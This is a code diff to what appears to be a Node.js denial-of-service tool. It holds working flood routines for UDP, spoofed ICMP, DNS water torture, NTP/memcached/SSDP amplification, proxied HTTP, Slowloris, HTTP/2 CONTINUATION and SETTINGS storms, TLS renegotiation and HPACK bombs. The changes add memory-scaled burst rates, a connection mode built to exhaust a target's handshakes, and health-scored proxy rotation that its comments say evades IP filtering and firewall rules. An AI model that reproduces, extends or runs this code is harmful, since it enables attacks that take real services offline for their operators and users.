@@ -12,13 +12,59 @@ import http from "node:http";
 import https from "node:https";
 import dgram from "node:dgram";
 import dns from "node:dns/promises";
+import os from "node:os";
 import { spawn } from "node:child_process";
 
-// ── Global agents — unlimited sockets, no pooling overhead ────────────────
-// Using dedicated agents per request to avoid any per-host connection cap
-// (undici/fetch pools to ≤128 connections per origin; http.Agent has no such cap)
-const HTTP_AGENT  = new http.Agent({ maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
-const HTTPS_AGENT = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
+// ── Resource-aware configuration ──────────────────────────────────────────
+const IS_PROD     = process.env.NODE_ENV === "production";
+const CPU_CORES   = os.cpus().length;
+
+// Dynamic burst — scales with available RAM (floor 50, ceil 800)
+function getDynamicBurst(base = 500): number {
+  const freeMB = os.freemem() / 1_048_576;
+  const scale  = Math.min(1.0, freeMB / 512);       // 512MB = full burst
+  return IS_PROD ? Math.max(50, Math.floor(base * scale)) : 8;
+}
+
+// ── Global agents — dual-mode: exhaustion vs throughput ───────────────────
+// Exhaustion: new TCP per request → maximizes SYN/handshake overhead on target
+// Throughput: keepAlive → maximizes requests per connection (bypasses conn limits)
+const HTTP_AGENT      = new http.Agent({  maxSockets: Infinity, keepAlive: false, scheduling: "lifo" });
+const HTTPS_AGENT     = new https.Agent({ maxSockets: Infinity, keepAlive: false, rejectUnauthorized: false, scheduling: "lifo" });
+const HTTP_KA_AGENT   = new http.Agent({  maxSockets: CPU_CORES * 64, keepAlive: true, keepAliveMsecs: 60_000, scheduling: "lifo" });
+const HTTPS_KA_AGENT  = new https.Agent({ maxSockets: CPU_CORES * 64, keepAlive: true, keepAliveMsecs: 60_000, rejectUnauthorized: false, scheduling: "lifo" });
+
+// ── Proxy health tracker — avoids hammering dead proxies ─────────────────
+interface ProxyHealth { successes: number; failures: number; lastCheck: number; banned: boolean; }
+const proxyHealth = new Map<string, ProxyHealth>();
+function getProxyHealth(host: string, port: number): ProxyHealth {
+  const key = `${host}:${port}`;
+  if (!proxyHealth.has(key)) proxyHealth.set(key, { successes: 0, failures: 0, lastCheck: Date.now(), banned: false });
+  return proxyHealth.get(key)!;
+}
+function recordProxySuccess(host: string, port: number): void {
+  const h = getProxyHealth(host, port);
+  h.successes++; h.lastCheck = Date.now(); h.banned = false;
+}
+function recordProxyFailure(host: string, port: number): void {
+  const h = getProxyHealth(host, port);
+  h.failures++; h.lastCheck = Date.now();
+  if (h.failures > 5 && h.failures / (h.successes + h.failures) > 0.8) h.banned = true;
+}
+function pickProxy(proxies: ProxyConfig[]): ProxyConfig {
+  // Filter out banned proxies (auto-unban after 2 min)
+  const now = Date.now();
+  const alive = proxies.filter(p => {
+    const h = proxyHealth.get(`${p.host}:${p.port}`);
+    if (!h) return true;
+    if (h.banned && now - h.lastCheck > 120_000) { h.banned = false; return true; }
+    return !h.banned;
+  });
+  const pool = alive.length > 0 ? alive : proxies; // fallback to all if all banned
+  return pool[randInt(0, pool.length)];
+}
+// Unban all proxies every 5 minutes
+setInterval(() => { for (const h of proxyHealth.values()) { if (h.banned) h.banned = false; } }, 300_000);
 
 // ── Types ─────────────────────────────────────────────────────────────────
 interface ProxyConfig { host: string; port: number; type?: "http" | "socks5"; username?: string; password?: string; }
@@ -195,9 +241,8 @@ async function runUDPFlood(
   // setInterval-burst pattern: guaranteed to yield to the event loop every 1ms.
   // Async-chain (inflight while-loop) starves the event loop in environments where
   // UDP callbacks fire without real network latency (loopback, blocked UDP, etc.).
-  const IS_DEV     = process.env.NODE_ENV !== "production";
-  const numSockets = IS_DEV ? Math.min(threads, 8) : Math.max(1, Math.min(threads, 32));
-  const BURST      = IS_DEV ? 8 : 500;   // packets per interval tick
+  const numSockets = IS_PROD ? Math.max(1, Math.min(threads, 32)) : Math.min(threads, 8);
+  const BURST      = getDynamicBurst(500);
   const TICK_MS    = 1;
   // Hit multiple ports to bypass single-port firewall rules
   const PORTS = [
@@ -290,8 +335,7 @@ async function runICMPFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -340,7 +384,7 @@ async function runICMPFlood(
         "--icmp", "--flood", "--rand-source", "-d", "1400", "-q", resolvedHost,
       ], { stdio: ["ignore","ignore","ignore"] });
       procs.push(p);
-      const pktRate = IS_DEV ? 100 : 50000;
+      const pktRate = !IS_PROD ? 100 : 50000;
       statIvs.push(setInterval(() => {
         if (!signal.aborted) { localPkts += pktRate; localBytes += pktRate * 1408; }
       }, 1000));
@@ -361,7 +405,7 @@ async function runICMPFlood(
   // = 500,000 pkt/s per socket × 64 sockets = 32M pkt/s link saturation.
   const ICMP_TRIGGER_PORTS = [1, 2, 3, 4, 5, 6, 7, 9, 13, 17, 19, 37, 65534, 65535];
   const PKT_LEN    = 1400;
-  const BURST      = IS_DEV ? 8 : 500;
+  const BURST = getDynamicBurst(500);
   const TICK_MS    = 1;
   const sockDones: Promise<void>[] = [];
   for (let _s = 0; _s < NUM_SOCKS; _s++) {
@@ -450,8 +494,7 @@ async function runDNSWaterTorture(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 48);
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 48) : Math.min(threads, 8);
 
   // Extract root domain for NS lookups (strip subdomains)
   const domainParts = hostname.replace(/^https?:\/\//, "").split(".");
@@ -483,7 +526,7 @@ async function runDNSWaterTorture(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  const BURST   = IS_DEV ? 4 : 200;  // DNS pkt build is CPU-heavy: smaller burst
+  const BURST = getDynamicBurst(200);
   const TICK_MS = 1;
   const sockDones: Promise<void>[] = [];
   for (let _s = 0; _s < NUM_SOCKS; _s++) {
@@ -555,9 +598,8 @@ async function runNTPFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
-  const BURST     = IS_DEV ? 8 : 500;
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
+  const BURST = getDynamicBurst(500);
   const TICK_MS   = 1;
 
   let localPkts = 0, localBytes = 0;
@@ -638,9 +680,8 @@ async function runMemcachedFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
-  const BURST     = IS_DEV ? 8 : 500;
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
+  const BURST = getDynamicBurst(500);
   const TICK_MS   = 1;
 
   let localPkts = 0, localBytes = 0;
@@ -722,9 +763,8 @@ async function runSSDPFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);
-  const BURST     = IS_DEV ? 8 : 500;
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);
+  const BURST = getDynamicBurst(500);
   const TICK_MS   = 1;
 
   let localPkts = 0, localBytes = 0;
@@ -900,11 +940,10 @@ async function runHTTPFlood(
     // Route through proxy pool when available — 95% via proxy to avoid IP filtering
     const useProxy = proxies.length > 0 && Math.random() < 0.95;
     if (useProxy) {
-      const proxy = proxies[proxyIdx % proxies.length];
-      proxyIdx++;
+      const proxy = pickProxy(proxies); // health-scored selection
       fetchViaProxy(url, proxy, method, headers as Record<string, string>, body)
-        .then(bytes => { inflight--; localPkts++; localBytes += bytes; })
-        .catch(() => { inflight--; localPkts++; localBytes += 100; });
+        .then(bytes => { inflight--; localPkts++; localBytes += bytes; recordProxySuccess(proxy.host, proxy.port); })
+        .catch(() => { inflight--; localPkts++; localBytes += 100; recordProxyFailure(proxy.host, proxy.port); });
       return;
     }
 
@@ -992,11 +1031,9 @@ async function runHTTPBypass(
   const layerAT = Math.max(1, Math.floor(threads * 0.50)); // fetch + proxy
   const layerBT = Math.max(1, Math.floor(threads * 0.30)); // raw http.request
   const layerCT = Math.max(1, threads - layerAT - layerBT); // slow drain
-
-  const IS_DEV = process.env.NODE_ENV !== "production";
-  const SLOTS_A = IS_DEV ? Math.min(layerAT * 3, 300)  : Math.min(layerAT * 8, 3000);
-  const SLOTS_B = IS_DEV ? Math.min(layerBT * 20, 2000) : Math.min(layerBT * 40, 20000);
-  const SLOTS_C = IS_DEV ? Math.min(layerCT * 4, 200)  : Math.min(layerCT * 6, 1500);
+  const SLOTS_A = !IS_PROD ? Math.min(layerAT * 3, 300)  : Math.min(layerAT * 8, 3000);
+  const SLOTS_B = !IS_PROD ? Math.min(layerBT * 20, 2000) : Math.min(layerBT * 40, 20000);
+  const SLOTS_C = !IS_PROD ? Math.min(layerCT * 4, 200)  : Math.min(layerCT * 6, 1500);
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -1472,8 +1509,7 @@ async function runSlowlorisReal(
 ): Promise<void> {
   // 50 connections per thread — trickle headers every 10-25s, starves server thread pool
   // Reduced from 100K to 15K: TLS sockets ~80KB each, 15K = ~1.2GB native memory per worker
-  const IS_DEV = process.env.NODE_ENV !== "production";
-  const MAX_CONN = IS_DEV
+  const MAX_CONN = !IS_PROD
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets
     : Math.min(threads * 50, 15000);        // prod: 15K sockets × 80KB TLS = 1.2GB per worker
   let localPkts = 0, localBytes = 0, activeConns = 0;
@@ -1630,8 +1666,7 @@ async function runConnFlood(
 ): Promise<void> {
   // 40 connections per thread — holds TLS handshake open, recycles every 5-20ms
   // Reduced from 80K to 12K: TLS sockets ~80KB each, 12K = ~960MB native memory per worker
-  const IS_DEV_CF = process.env.NODE_ENV !== "production";
-  const MAX_CONN = IS_DEV_CF
+  const MAX_CONN = !IS_PROD
     ? Math.min(threads * 8, 800)            // dev: max 800 sockets
     : Math.min(threads * 40, 12000);        // prod: 12K TLS sockets × 80KB = 960MB per worker
   let localPkts = 0, localBytes = 0, activeConns = 0, pIdx = 0;
@@ -2603,9 +2638,7 @@ async function runH2Continuation(
       payload.writeUInt32LE(Math.random() * 0x100000000 >>> 0, i);
     return mkFrame(0x09, 0x00, streamId, payload); // type 0x09 = CONTINUATION, flags=0 (no END_HEADERS)
   };
-
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 800); // 800 slots × 150KB = 120MB per worker
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 800); // 800 slots × 150KB = 120MB per worker
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2719,8 +2752,7 @@ async function runTLSRenego(
   onStats: (p: number, b: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 800); // 32GB: 800 RSA slots; 8vCPU handles 800 × 10 renegotiations/sec
 
   let localPkts = 0, localBytes = 0;
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
@@ -2831,9 +2863,8 @@ async function runH2SettingsStorm(
   onStats: (p: number, b: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
-  const OPEN_STREAMS = IS_DEV ? 20 : 50; // PROD: 50 half-open streams × 800 slots = 40K pending streams (still effective)
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K slots × 100KB = 200MB
+  const OPEN_STREAMS = !IS_PROD ? 20 : 50; // PROD: 50 half-open streams × 800 slots = 40K pending streams (still effective)
 
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
     const f = Buffer.allocUnsafe(9 + payload.length);
@@ -2978,8 +3009,7 @@ async function runWSFlood(
   onStats: (p: number, b: number, c?: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const MAX_CONNS = IS_DEV ? Math.min(threads * 4, 400) : Math.min(threads * 15, 5000); // 5K WS × 40KB = 200MB per worker
+  const MAX_CONNS = !IS_PROD ? Math.min(threads * 4, 400) : Math.min(threads * 15, 5000); // 5K WS × 40KB = 200MB per worker
   const useHttps  = targetPort === 443;
 
   const WS_PATHS  = ["/ws", "/websocket", "/socket", "/socket.io/", "/live", "/chat",
@@ -3344,9 +3374,8 @@ async function runQUICFlood(
   signal:       AbortSignal,
   onStats:      (p: number, b: number) => void,
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SOCKS = IS_DEV ? Math.min(threads, 8) : Math.min(threads, 64);   // 32GB: 64 UDP sockets
-  const INFLIGHT  = IS_DEV ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
+  const NUM_SOCKS = IS_PROD ? Math.min(threads, 64) : Math.min(threads, 8);   // 32GB: 64 UDP sockets
+  const INFLIGHT  = !IS_PROD ? 200 : 2000; // 32GB: 2K inflight QUIC initials per socket
   const PKTSIZE   = 1200; // QUIC minimum MTU
 
   const makeQUICInitial = (): Buffer => {
@@ -3437,8 +3466,7 @@ async function runCachePoison(
   onStats: (p: number, b: number) => void,
   proxies: ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1500 CDN-busting slots
 
   const rand    = (n: number) => Math.random() * n | 0;
   const rHex    = (n: number) => Array.from({ length: n }, () => (rand(16)).toString(16)).join("");
@@ -3526,8 +3554,7 @@ async function runRUDYv2(
   onStats:      (p: number, b: number, c: number) => void,
   proxies:      ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 60) : Math.min(threads, 2000); // 32GB: 2K multipart slow POSTs × 20KB = 40MB
   const SEND_MS   = 5_000;
 
   const chars    = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";
@@ -3611,8 +3638,7 @@ async function runSSLDeathRecord(
   onStats:      (p: number, b: number, c: number) => void,
   proxies:      ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 50) : Math.min(threads, 1000); // 32GB: 1K SSL-death slots
   const RATE_MS   = 10; // 100 records/sec per slot
 
   let openConns = 0, pIdx = 0;
@@ -3696,8 +3722,7 @@ async function runHPACKBomb(
   onStats:     (p: number, b: number) => void,
   proxies:     ProxyConfig[] = [],
 ): Promise<void> {
-  const IS_DEV    = process.env.NODE_ENV !== "production";
-  const NUM_SLOTS = IS_DEV ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections
+  const NUM_SLOTS = !IS_PROD ? Math.min(threads, 80) : Math.min(threads, 1500); // 32GB: 1.5K HPACK bomb connections
 
   // Raw H2 frame builder (identical layout to h2-continuation)
   const mkFrame = (type: number, flags: number, streamId: number, payload: Buffer): Buffer => {
